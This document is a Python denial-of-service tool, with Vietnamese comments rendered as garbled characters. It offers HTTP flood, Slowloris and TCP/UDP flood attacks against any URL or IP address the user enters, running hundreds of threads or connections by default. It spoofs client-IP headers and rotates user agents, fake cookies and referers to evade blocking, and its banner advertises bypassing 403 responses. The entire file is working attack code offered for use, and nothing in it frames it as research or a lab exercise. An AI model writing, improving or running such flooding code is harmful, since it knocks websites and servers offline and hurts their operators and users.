import os
import random
import socket
import threading
import time
import asyncio
import aiohttp
from collections import deque # D√πng cho danh s√°ch User-Agent xoay v√≤ng

DEFAULT_THREADS = 800# TƒÉng s·ªë lu·ªìng m·∫∑c ƒë·ªãnh
DEFAULT_PACKET_SIZE = 65500
DEFAULT_CONNECTIONS = 1500 # TƒÉng s·ªë k·∫øt n·ªëi m·∫∑c ƒë·ªãnh cho Slowloris
RETRY_DELAY = 0.005 # Gi·∫£m th·ªùi gian ch·ªù l·∫°i khi l·ªói ƒë·ªÉ tƒÉng t·ªëc ƒë·ªô

# Danh s√°ch User-Agent ƒëa d·∫°ng h∆°n
USER_AGENTS = [
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.37",
    # Mobile User Agents
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 12; Mobile; rv:103.0) Gecko/103.0 Firefox/103.0",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
]

# S·ª≠ d·ª•ng deque ƒë·ªÉ xoay v√≤ng User-Agent hi·ªáu qu·∫£ h∆°n
user_agent_deque = deque(USER_AGENTS)

def get_rotating_user_agent():
    """L·∫•y User-Agent t·ª´ danh s√°ch xoay v√≤ng."""
    ua = user_agent_deque.popleft()
    user_agent_deque.append(ua) # ƒê∆∞a l·∫°i v√†o cu·ªëi h√†ng ƒë·ª£i
    return ua

def get_fake_ip():
    """T·∫°o m·ªôt ƒë·ªãa ch·ªâ IP gi·∫£ ng·∫´u nhi√™n c√≥ v·∫ª h·ª£p l·ªá h∆°n."""
    # Tr√°nh c√°c d·∫£i IP ƒë·∫∑c bi·ªát (0.0.0.0/8, 10.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.0.0.0/24, 192.0.2.0/24, 192.88.99.0/24, 192.168.0.0/16, 198.18.0.0/15, 198.51.100.0/24, 203.0.113.0/24, 224.0.0.0/4, 240.0.0.0/4, 255.255.255.255/32)
    # L·∫•y IP ng·∫´u nhi√™n t·ª´ d·∫£i c√¥ng c·ªông ph·ªï bi·∫øn
    while True:
        first_octet = random.randint(1, 223) # Tr√°nh 0 v√† d·∫£i multicast
        if first_octet in [10, 127, 169, 172, 192]: # Tr√°nh c√°c d·∫£i IP private/reserved ph·ªï bi·∫øn
            continue
        ip = ".".join(str(random.randint(1, 255)) for _ in range(3))
        return f"{first_octet}.{ip}"

def get_fake_cookie():
    """T·∫°o m·ªôt chu·ªói cookie gi·∫£ ng·∫´u nhi√™n v√† ph·ª©c t·∫°p h∆°n."""
    return f"__cfduid={os.urandom(16).hex()}; _ga={os.urandom(10).hex()}.{os.urandom(10).hex()}; sessionid={os.urandom(12).hex()}; PHPSESSID={os.urandom(8).hex()}; csrftoken={os.urandom(16).hex()}"

def get_headers():
    """T·∫°o m·ªôt b·ªô ti√™u ƒë·ªÅ HTTP ho√†n ch·ªânh v·ªõi IP, cookie v√† User-Agent gi·∫£ m·ªõi cho m·ªói y√™u c·∫ßu."""
    ip = get_fake_ip()
    referers = [
        "https://www.google.com/",
        "https://www.youtube.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://bing.com/",
        "https://search.yahoo.com/",
        "https://duckduckgo.com/",
        "https://www.baidu.com/",
        "https://www.reddit.com/",
        "https://www.instagram.com/",
    ]
    return {
        "User-Agent": get_rotating_user_agent(), # L·∫•y User-Agent xoay v√≤ng
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", # Th√™m Accept
        "Accept-Language": "en-US,en;q=0.5", # Th√™m Accept-Language
        "Accept-Encoding": "gzip, deflate, br", # Th√™m br (Brotli)
        "Referer": random.choice(referers),
        "X-Forwarded-For": ip,
        "Client-IP": ip,
        "True-Client-IP": ip,
        "Via": f"1.1 {ip}", # C·∫£i thi·ªán Via header
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache", # Th√™m Pragma
        "DNT": "1", # Do Not Track
        "Cookie": get_fake_cookie(),
        "Origin": "https://www.google.com",
        "Sec-Fetch-Site": random.choice(["same-origin", "cross-site", "none"]), # ƒêa d·∫°ng h√≥a
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]), # ƒêa d·∫°ng h√≥a
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": random.choice(["document", "empty", "image"]), # ƒêa d·∫°ng h√≥a
        "TE": "Trailers", # Th√™m TE
        "Upgrade-Insecure-Requests": "1" # Y√™u c·∫ßu n√¢ng c·∫•p l√™n HTTPS
    }

async def make_request(session, url, attack_type, sleep_time=0):
    """
    Th·ª±c hi·ªán m·ªôt y√™u c·∫ßu HTTP duy nh·∫•t v·ªõi c√°c ti√™u ƒë·ªÅ gi·∫£ m·∫°o m·ªõi cho m·ªói y√™u c·∫ßu.
    """
    current_headers = get_headers() # T·∫°o ti√™u ƒë·ªÅ m·ªõi cho m·ªói y√™u c·∫ßu ƒë·ªÉ thay ƒë·ªïi IP, UA, v.v.
    try:
        async with session.get(url, headers=current_headers, allow_redirects=True) as resp: # Cho ph√©p chuy·ªÉn h∆∞·ªõng
            if resp.status == 403:
                print(f"[{attack_type} 403] B·ªã ch·∫∑n! ƒê·ªïi IP & D·ª´ng 7-9s ‚Üí {url}")
                await asyncio.sleep(random.uniform(10, 15))
            elif resp.status >= 400: # X·ª≠ l√Ω c√°c m√£ l·ªói kh√°c ngo√†i 403
                print(f"[{attack_type} {resp.status}] L·ªói! ƒê·ªïi IP & D·ª´ng ng·∫Øn ‚Üí {url}")
                await asyncio.sleep(RETRY_DELAY * 5) # D·ª´ng l√¢u h∆°n m·ªôt ch√∫t
            else:
                print(f"[{attack_type}] {resp.status if attack_type == 'HTTP' else 'Gi·ªØ k·∫øt n·ªëi'} ‚Üí {url} | IP gi·∫£: {current_headers['X-Forwarded-For']}")
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
    except aiohttp.ClientError as e: # B·∫Øt l·ªói c·ª• th·ªÉ c·ªßa aiohttp (k·∫øt n·ªëi, timeout, DNS)
        # print(f"[L·ªói {attack_type}] L·ªói k·∫øt n·ªëi/timeout/DNS: {e}")
        await asyncio.sleep(RETRY_DELAY * 2) # TƒÉng th·ªùi gian ch·ªù khi c√≥ l·ªói k·∫øt n·ªëi
    except Exception as e: # B·∫Øt c√°c l·ªói kh√°c
        # print(f"[L·ªói {attack_type}] L·ªói kh√¥ng x√°c ƒë·ªãnh: {e}")
        await asyncio.sleep(RETRY_DELAY * 3)

async def http_flood(session, url):
    """
    Th·ª±c hi·ªán t·∫•n c√¥ng HTTP Flood b·∫±ng c√°ch li√™n t·ª•c g·ª≠i y√™u c·∫ßu GET.
    M·ªói y√™u c·∫ßu s·∫Ω s·ª≠ d·ª•ng IP gi·∫£ m·ªõi v√† c√°c ti√™u ƒë·ªÅ ƒëa d·∫°ng.
    """
    while True:
        await make_request(session, url, "HTTP")
        await asyncio.sleep(0) # Cho ph√©p lu√¢n phi√™n gi·ªØa c√°c t√°c v·ª•

async def slowloris_attack(url):
    """
    Th·ª±c hi·ªán t·∫•n c√¥ng Slowloris b·∫±ng c√°ch gi·ªØ c√°c k·∫øt n·ªëi m·ªü.
    M·ªói k·∫øt n·ªëi s·∫Ω s·ª≠ d·ª•ng IP gi·∫£ m·ªõi v√† c√°c ti√™u ƒë·ªÅ ƒëa d·∫°ng.
    """
    # T·∫°o ClientSession m·ªõi cho m·ªói lu·ªìng Slowloris ƒë·ªÉ qu·∫£n l√Ω k·∫øt n·ªëi ƒë·ªôc l·∫≠p
    # Timeout t·ªïng th·ªÉ l·ªõn h∆°n cho Slowloris ƒë·ªÉ duy tr√¨ k·∫øt n·ªëi l√¢u h∆°n
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
        while True:
            await make_request(session, url, "Slowloris", sleep_time=random.uniform(10, 20)) # TƒÉng ng·∫´u nhi√™n th·ªùi gian ch·ªù
            await asyncio.sleep(0) # Cho ph√©p lu√¢n phi√™n gi·ªØa c√°c t√°c v·ª•

def tcp_udp_flood(target_ip, attack_type, packet_size):
    payload = os.urandom(packet_size)

    while True:
        port = random.randint(1, 65535) # Ch·ªçn c·ªïng ng·∫´u nhi√™n
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if attack_type == "UDP" else socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(1.5) # ƒê·∫∑t timeout cho k·∫øt n·ªëi v√† g·ª≠i/nh·∫≠n

            if attack_type == "TCP":
                sock.connect((target_ip, port))
                # G·ª≠i m·ªôt ph·∫ßn payload ban ƒë·∫ßu, sau ƒë√≥ g·ª≠i c√°c ph·∫ßn c√≤n l·∫°i ƒë·ªÉ gi·ªØ k·∫øt n·ªëi
                sock.sendall(payload[:packet_size // 4]) # G·ª≠i 1/4 payload ban ƒë·∫ßu
                time.sleep(0.1) # Ch·ªù m·ªôt ch√∫t
                sock.sendall(payload[packet_size // 4:]) # G·ª≠i ph·∫ßn c√≤n l·∫°i

            else: # UDP
                sock.sendto(payload, (target_ip, port))

            print(f"[{attack_type} Flood] Sent {len(payload)} bytes ‚Üí {target_ip}:{port}")

        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            # print(f"[L·ªói {attack_type} Flood] L·ªói k·∫øt n·ªëi/g·ª≠i: {e}")
            time.sleep(RETRY_DELAY)
        except Exception as e:
            # print(f"[L·ªói {attack_type} Flood] L·ªói kh√¥ng x√°c ƒë·ªãnh: {e}")
            time.sleep(RETRY_DELAY)
        finally:
            sock.close()

def main():
    os.system("clear" if os.name == "posix" else "cls")
    print("üöÄ TOOL DDoS N√â 403 & M·∫†NH M·∫º H∆†N NHI·ªÄU! üöÄ")
    print("1Ô∏è‚É£ HTTP Flood (Spam request - IP gi·∫£ & UA, cookie si√™u linh ho·∫°t)")
    print("2Ô∏è‚É£ Slowloris (Gi·ªØ k·∫øt n·ªëi - IP gi·∫£ & UA, cookie si√™u linh ho·∫°t)")
    print("3Ô∏è‚É£ TCP/UDP Flood (G·ª≠i g√≥i tin - C·∫£i thi·ªán TCP, th√™m timeout)")
    print("4Ô∏è‚É£ Ch·∫°y t·∫•t c·∫£ c√πng l√∫c!")
    attack_type = input("Ch·ªçn ph∆∞∆°ng th·ª©c t·∫•n c√¥ng (1/2/3/4): ")

    if attack_type == "1":
        url = input("Nh·∫≠p URL website: ")
        threads = int(input(f"Nh·∫≠p s·ªë lu·ªìng (m·∫∑c ƒë·ªãnh {DEFAULT_THREADS}): ") or DEFAULT_THREADS)
        print(f"üöÄ HTTP Flood ‚Üí {url} v·ªõi {threads} lu·ªìng (IP gi·∫£, UA, cookie li√™n t·ª•c ƒë·ªïi)!")
        asyncio.run(run_http_flood(url, threads))

    elif attack_type == "2":
        url = input("Nh·∫≠p URL website: ")
        threads = int(input(f"Nh·∫≠p s·ªë lu·ªìng (m·∫∑c ƒë·ªãnh {DEFAULT_CONNECTIONS}): ") or DEFAULT_CONNECTIONS)
        print(f"üêå Slowloris Attack ‚Üí {url} v·ªõi {threads} lu·ªìng (IP gi·∫£, UA, cookie li√™n t·ª•c ƒë·ªïi)!")
        asyncio.run(run_slowloris_attack_multi(url, threads))

    elif attack_type == "3":
        target_ip = input("Nh·∫≠p IP m·ª•c ti√™u: ")
        method = input("Ch·ªçn ki·ªÉu t·∫•n c√¥ng (TCP/UDP): ").upper()
        threads = int(input(f"Nh·∫≠p s·ªë lu·ªìng (m·∫∑c ƒë·ªãnh {DEFAULT_THREADS}): ") or DEFAULT_THREADS)
        packet_size = int(input("Nh·∫≠p k√≠ch th∆∞·ªõc g√≥i tin (m·∫∑c ƒë·ªãnh 65500 bytes): ") or DEFAULT_PACKET_SIZE)
        print(f"üî• {method} Flood ‚Üí {target_ip} v·ªõi {threads} lu·ªìng (c√≥ timeout v√† c·∫£i thi·ªán TCP)!")
        for _ in range(threads):
            thread = threading.Thread(target=tcp_udp_flood, args=(target_ip, method, packet_size))
            thread.daemon = True
            thread.start()
        while True:
            time.sleep(1)

    elif attack_type == "4":
        url = input("Nh·∫≠p URL website: ")
        target_ip = input("Nh·∫≠p IP m·ª•c ti√™u: ")
        method = input("Ch·ªçn ki·ªÉu t·∫•n c√¥ng (TCP/UDP): ").upper()
        threads = int(input(f"Nh·∫≠p s·ªë lu·ªìng cho HTTP/TCP/UDP (m·∫∑c ƒë·ªãnh {DEFAULT_THREADS}): ") or DEFAULT_THREADS)
        slowloris_threads = int(input(f"Nh·∫≠p s·ªë lu·ªìng cho Slowloris (m·∫∑c ƒë·ªãnh {DEFAULT_CONNECTIONS}): ") or DEFAULT_CONNECTIONS)
        packet_size = int(input("Nh·∫≠p k√≠ch th∆∞·ªõc g√≥i tin (m·∫∑c ƒë·ªãnh {DEFAULT_PACKET_SIZE}): ") or DEFAULT_PACKET_SIZE)
        print(f"üöÄ Ch·∫°y t·∫•t c·∫£ t·∫•n c√¥ng v√†o {url} v√† {target_ip}!")

        async def run_all_async_attacks():
            await asyncio.gather(
                run_http_flood(url, threads),
                run_slowloris_attack_multi(url, slowloris_threads)
            )

        async_thread = threading.Thread(target=lambda: asyncio.run(run_all_async_attacks()))
        async_thread.daemon = True
        async_thread.start()

        for _ in range(threads):
            thread = threading.Thread(target=tcp_udp_flood, args=(target_ip, method, packet_size))
            thread.daemon = True
            thread.start()

        while True:
            time.sleep(1)

    else:
        print("‚ùå L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá!")

async def run_http_flood(url, threads):
    timeout = aiohttp.ClientTimeout(total=10)
    conn = aiohttp.TCPConnector(limit=None, ssl=False, limit_per_host=0) # limit_per_host=0 ƒë·ªÉ kh√¥ng gi·ªõi h·∫°n k·∫øt n·ªëi ƒë·∫øn c√πng m·ªôt host
    async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
        tasks = [http_flood(session, url) for _ in range(threads)]
        await asyncio.gather(*tasks)

async def run_slowloris_attack_multi(url, threads):
    tasks = [slowloris_attack(url) for _ in range(threads)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nüëã ƒê√£ d·ª´ng c√¥ng c·ª•.")
    except Exception as e:
        print(f"üö® L·ªói nghi√™m tr·ªçng: {e}")

